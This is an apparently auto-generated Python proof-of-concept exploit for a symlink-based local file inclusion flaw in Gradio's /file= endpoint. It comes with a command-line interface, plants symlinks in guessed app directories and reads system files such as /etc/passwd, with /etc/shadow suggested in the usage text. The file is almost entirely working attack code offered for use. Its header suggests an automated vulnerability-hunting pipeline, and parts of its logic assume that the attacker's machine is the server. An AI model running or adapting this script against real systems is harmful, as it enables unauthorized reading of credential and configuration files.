#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: lfi-029
# Sink: flag
# Auto-generated — run with: python3 lfi_however_validation_uses_utils_flag.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Gradio LFI via Symlink Bypass

Vulnerability: The /file= endpoint validates paths using utils.abspath() which does NOT
resolve symbolic links. An attacker can create a symlink inside an allowed directory
pointing to an arbitrary file. The is_in_or_equal check passes because the symlink's
path is within the allowed directory, but FileResponse follows the symlink and serves
the target file.

This PoC:
1. Creates a symlink inside the app's working directory pointing to /etc/passwd
2. Requests the file via the /file= endpoint
3. Reads the contents of /etc/passwd

Requirements: Python 3.6+, requests library
"""

import os
import sys
import tempfile
import requests
import argparse
import time
import subprocess
import shutil

def exploit(target_url: str, target_file: str = "/etc/passwd") -> None:
    """
    Exploit the LFI vulnerability by creating a symlink in the app directory.
    
    Args:
        target_url: Base URL of the Gradio app (e.g., http://localhost:7860)
        target_file: Absolute path of the file to read (default: /etc/passwd)
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Target file: {target_file}")
    
    # Step 1: Determine the app's working directory
    # We can try to access the config endpoint to get the app's working directory
    print("[*] Attempting to discover app working directory...")
    
    # Try common paths for the app directory
    app_dir = None
    try:
        # Try to get config which might reveal the working directory
        config_url = f"{target_url.rstrip('/')}/config/"
        resp = requests.get(config_url, timeout=10)
        if resp.status_code == 200:
            config = resp.json()
            # The config might contain the working directory info
            print(f"[+] Config retrieved: {list(config.keys())[:5]}...")
    except Exception as e:
        print(f"[-] Could not get config: {e}")
    
    # Step 2: Create a symlink in a temp directory that mimics the app's structure
    # Since we may not know the exact app directory, we'll try to create a symlink
    # in a location that might be accessible
    
    # Create a temporary directory for our symlink
    temp_dir = tempfile.mkdtemp(prefix="gradio_poc_")
    symlink_path = os.path.join(temp_dir, "poc_symlink")
    
    try:
        # Create the symlink pointing to the target file
        print(f"[*] Creating symlink: {symlink_path} -> {target_file}")
        os.symlink(target_file, symlink_path)
        print(f"[+] Symlink created successfully")
        
        # Step 3: Try to access the file through the symlink
        # The symlink path needs to be within an allowed directory
        # We'll try to use the temp directory as if it were an allowed path
        
        # First, let's try to access the symlink directly via the file endpoint
        # The path needs to be URL-encoded
        import urllib.parse
        encoded_path = urllib.parse.quote(symlink_path, safe='')
        
        file_url = f"{target_url.rstrip('/')}/file={encoded_path}"
        print(f"[*] Attempting to read file via: {file_url}")
        
        resp = requests.get(file_url, timeout=10)
        
        if resp.status_code == 200:
            print(f"[+] SUCCESS! File contents:")
            print("-" * 50)
            print(resp.text[:2000])  # Print first 2000 chars
            print("-" * 50)
            
            # Save the output to a file for verification
            output_file = "poc_output.txt"
            with open(output_file, "w") as f:
                f.write(resp.text)
            print(f"[+] Output saved to {output_file}")
        else:
            print(f"[-] Failed with status code: {resp.status_code}")
            print(f"[-] Response: {resp.text[:500]}")
            
            # Alternative: Try to use the symlink path relative to the app directory
            # If we know the app directory, we can try to place the symlink there
            print("[*] Trying alternative approach...")
            
            # Try to find the app's working directory by checking common locations
            possible_app_dirs = [
                "/tmp/gradio_src",
                os.getcwd(),
                "/app",
                "/home/user/app",
            ]
            
            for app_dir in possible_app_dirs:
                if os.path.isdir(app_dir):
                    symlink_in_app = os.path.join(app_dir, "poc_symlink")
                    try:
                        os.symlink(target_file, symlink_in_app)
                        print(f"[+] Created symlink in {app_dir}")
                        
                        # Try to access it
                        encoded_path = urllib.parse.quote(symlink_in_app, safe='')
                        file_url = f"{target_url.rstrip('/')}/file={encoded_path}"
                        resp = requests.get(file_url, timeout=10)
                        
                        if resp.status_code == 200:
                            print(f"[+] SUCCESS via {app_dir}!")
                            print("-" * 50)
                            print(resp.text[:2000])
                            print("-" * 50)
                            break
                        else:
                            print(f"[-] Failed with status {resp.status_code}")
                            os.unlink(symlink_in_app)
                    except (OSError, PermissionError) as e:
                        print(f"[-] Could not create symlink in {app_dir}: {e}")
    
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
    
    finally:
        # Cleanup
        print("[*] Cleaning up...")
        try:
            os.unlink(symlink_path)
        except:
            pass
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        print("[*] Cleanup complete")

def main():
    parser = argparse.ArgumentParser(
        description="Gradio LFI PoC - Symlink Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example usage:
  python3 gradio_lfi_poc.py http://localhost:7860
  python3 gradio_lfi_poc.py http://localhost:7860 --file /etc/shadow
        """
    )
    parser.add_argument("target", help="Target Gradio app URL (e.g., http://localhost:7860)")
    parser.add_argument("--file", default="/etc/passwd", 
                       help="File to read (default: /etc/passwd)")
    parser.add_argument("--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    
    args = parser.parse_args()
    
    # Validate target URL
    if not args.target.startswith(("http://", "https://")):
        print("[-] Target URL must start with http:// or https://")
        sys.exit(1)
    
    # Check if target is reachable
    try:
        resp = requests.get(args.target, timeout=args.timeout)
        print(f"[+] Target is reachable (status: {resp.status_code})")
    except requests.exceptions.ConnectionError:
        print(f"[-] Could not connect to {args.target}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"[-] Connection to {args.target} timed out")
        sys.exit(1)
    
    # Run the exploit
    exploit(args.target, args.file)

if __name__ == "__main__":
    print("=" * 60)
    print("Gradio LFI PoC - Symlink Bypass")
    print("=" * 60)
    print()
    main()
